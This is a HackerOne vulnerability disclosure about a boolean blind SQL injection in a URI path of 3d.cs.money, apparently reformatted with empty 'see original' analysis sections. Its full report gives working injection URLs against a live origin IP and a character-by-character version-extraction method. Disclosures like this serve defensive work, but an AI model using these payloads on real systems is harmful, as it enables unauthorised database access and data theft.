# Blind Based SQL Injection in 3d.sc.money

## Metadata
- **Source:** HackerOne
- **Report:** 1107536 | https://hackerone.com/reports/1107536
- **Submitted:** 2021-02-19
- **Reporter:** sawmj
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** unknown
- **Vuln:** SQL Injection
- **CVEs:** None
- **Category:** uncategorised

## Summary
Greetings, Hope Y'all good and fine!

## Summary:

I found a  Boolean Blind based SQL Injection in your website =>  3d.cs.money

It's a URI path injection. 

The vulnerability tested on the Original IP behind the CloudflareWAF and I've already reported this in my other report #1105673




### The Affected URI :

http://51.83.253.82/item/default %INJECTION_POINT_HERE%


## Steps To Reproduce:
Go to

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Greetings, Hope Y'all good and fine!

## Summary:

I found a  Boolean Blind based SQL Injection in your website =>  3d.cs.money

It's a URI path injection. 

The vulnerability tested on the Original IP behind the CloudflareWAF and I've already reported this in my other report #1105673




### The Affected URI :

http://51.83.253.82/item/default %INJECTION_POINT_HERE%


## Steps To Reproduce:
Go to 


"http://51.83.253.82/item/default'and%20UPPER('asd')='asd'--"   => It will give you 404
BUT
"http://51.83.253.82/item/default'and%20UPPER('asd')='ASD'--" => It will give you 200







As a PoC I  extracted just the version number which is : `20.9.2.2`

and the steps to produce that  :

http://51.83.253.82/item/default'and%20substr(version(),1,1)='2'-- ==> will give you 200 OK
http://51.83.253.82/item/default'and%20substr(version(),2,1)='0'-- ==> will give you 200 OK
So on so fourth until you get the full version number.

## Impact

Without sufficient removal or quoting of SQL syntax in user-controllable inputs, the generated SQL query can cause those inputs to be interpreted as SQL instead of ordinary user data. This can be used to alter query logic to bypass security checks, or to insert additional statements that modify the back-end database, possibly including execution of system commands.

</details>

---
*Analysed by Claude on 2026-05-24*
